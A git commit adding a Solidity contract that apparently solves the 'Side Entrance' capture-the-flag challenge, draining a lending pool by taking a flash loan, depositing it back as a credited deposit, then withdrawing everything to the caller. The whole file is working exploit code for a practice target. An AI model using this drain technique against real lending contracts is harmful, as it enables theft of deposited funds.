29d1778b17e5c32c8a3dbc2b2b604af46cf5013f
VishnuKMi <vishnuarley@gmail.com>
2023-05-05 05:47:32 +0530

    init

---
+++ contracts/side-entrance/IFlashLoanEtherReceiver.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract IFlashLoanEtherReceiver {
+    
+    uint256 public amount;
+    address payable public pool;
+
+    constructor(address payable _pool) {
+        pool = _pool;
+        amount = pool.balance;
+    }
+
+    function execute() external payable {
+        (bool success, ) = pool.call{value: amount} (
+            abi.encodeWithSignature("deposit()")
+        );
+        require(success, "Failed to deposit");
+    }
+
+    function takeLoan() public {
+        (bool success, ) = pool.call(
+            abi.encodeWithSignature("flashLoan(uint256)", amount)
+        );
+        require(success, "Failed to get Loan");
+    }
+
+    function withdrawToPlayer() public {
+        (bool success, ) = pool.call(
+            abi.encodeWithSignature("withdraw()")
+        );
+        require(success, "Failed withdraw from pool");
+        payable(msg.sender).transfer(amount);
+    }
+
+    receive() external payable {}
+
+}
